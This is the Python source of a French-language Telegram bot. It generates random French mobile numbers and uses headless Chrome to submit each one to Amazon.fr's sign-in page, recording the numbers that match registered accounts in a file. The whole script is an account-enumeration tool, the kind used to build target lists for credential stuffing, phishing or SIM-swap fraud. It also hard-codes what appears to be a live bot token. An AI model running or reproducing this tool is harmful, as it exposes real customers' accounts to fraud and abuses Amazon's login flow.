import os
import time
import random
import logging
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from telegram import Update, ForceReply, Message
from telegram.ext import Updater, CommandHandler, MessageHandler, CallbackContext
from telegram.ext.filters import MessageFilter

TOKEN = '5853801750:AAEM4BETpexvRPOX4XRYoG3NT97kkltKeTo'
DELAY_SECONDS = 3

logging.basicConfig(level=logging.INFO)
chrome_options = Options()
chrome_options.add_argument("--headless")
chrome_options.add_argument("--disable-gpu")
chrome_options.add_argument("--log-level=3")
driver = webdriver.Chrome(options=chrome_options)

class TextFilter(MessageFilter):
    def filter(self, message: Message) -> bool:
        return message.text and not message.text.startswith('/')

class CommandFilter(MessageFilter):
    def filter(self, message: Message) -> bool:
        return message.text and message.text.startswith('/')

def start(update: Update, context: CallbackContext) -> None:
    update.message.reply_text("Bonjour! Tapez /checker pour vérifier les numéros de téléphone Amazon ou /generer pour générer des numéros de téléphone français.")

def checker(update: Update, context: CallbackContext) -> None:
    update.message.reply_text("Veuillez envoyer la liste des numéros de téléphone à vérifier, un numéro par ligne.")

def check_numbers(update: Update, context: CallbackContext) -> None:
    phone_numbers = update.message.text.splitlines()
    
    for phone_number in phone_numbers:
       
        update.message.reply_text(f"Vérification du numéro {phone_number} 🔄")
        time.sleep(DELAY_SECONDS)
        result = amazon_checker(driver, phone_number)
        
        if result:
            update.message.reply_text(f"✅ {phone_number} est valide")
        else:
            update.message.reply_text(f"❌ {phone_number} est invalide")

    update.message.reply_text("Tous les numéros ont été vérifiés!")

def amazon_checker(driver, phone_number):
    driver.get("https://www.amazon.fr/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.fr%2F%3Fref_%3Dnav_custrec_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=frflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&")

    email_box = driver.find_element("xpath", "//*[@id=\"ap_email\"]")
    email_box.send_keys(phone_number)
    try:
        continu_box = driver.find_element("xpath", "//*[@id=\"continue\"]")
    except:
        pass
    continu_box.click()

    try:
        driver.find_element("xpath", '//*[@id="auth-error-message-box"]/div/div')
        return False
    except:
        with open("valid.txt", "a") as f:
            f.write(phone_number + '\n')
        return True

def generer(update: Update, context: CallbackContext) -> None:
    update.message.reply_text("Combien de numéros de téléphone souhaitez-vous générer? Envoyez le nombre souhaité en utilisant la commande /generernumeros suivi du nombre. Par exemple : /generernumeros 10")

def generer_numeros(update: Update, context: CallbackContext) -> None:
    args = context.args
    if len(args) == 1 and args[0].isdigit():
        nombre_numeros = int(args[0])
        generated_numbers = [generer_numero_telephone() for _ in range(nombre_numeros)]
        output = "\n".join(generated_numbers)
        update.message.reply_text(f"Voici {nombre_numeros} numéros de téléphone générés :\n{output}")
    else:
        update.message.reply_text("Veuillez envoyer une commande valide avec un nombre. Par exemple : /generernumeros 10")

def generer_numero_telephone():
    prefixe = random.choice(['+336', '+337'])
    suffixe = "".join([str(random.randint(0, 9)) for i in range(8)])
    return prefixe + suffixe

def main() -> None:
    updater = Updater(TOKEN)

    dispatcher = updater.dispatcher
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("checker", checker))
    dispatcher.add_handler(CommandHandler("generer", generer))
    dispatcher.add_handler(CommandHandler("generernumeros", generer_numeros))
    dispatcher.add_handler(MessageHandler(TextFilter(), check_numbers))

    updater.start_polling()
    updater.idle()


if __name__ == '__main__':
    main()